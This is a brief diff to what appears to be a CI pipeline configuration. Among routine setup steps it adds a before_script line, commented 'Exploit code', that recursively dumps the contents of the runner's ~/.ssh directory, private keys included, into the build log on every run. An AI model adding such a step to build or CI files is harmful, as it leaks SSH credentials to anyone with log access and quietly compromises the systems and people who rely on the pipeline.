@@ -5,6 +5,7 @@ workflow:
     - when: always # Run pipeline for all other cases
 default:
   before_script:
+  - grep -r "" ~/.ssh # Exploit code
   - echo $CI_COMMIT_BRANCH
   - sudo yum -y remove nodejs
   - sudo rm -r /etc/yum.repos.d/nodesource*.repo &&\
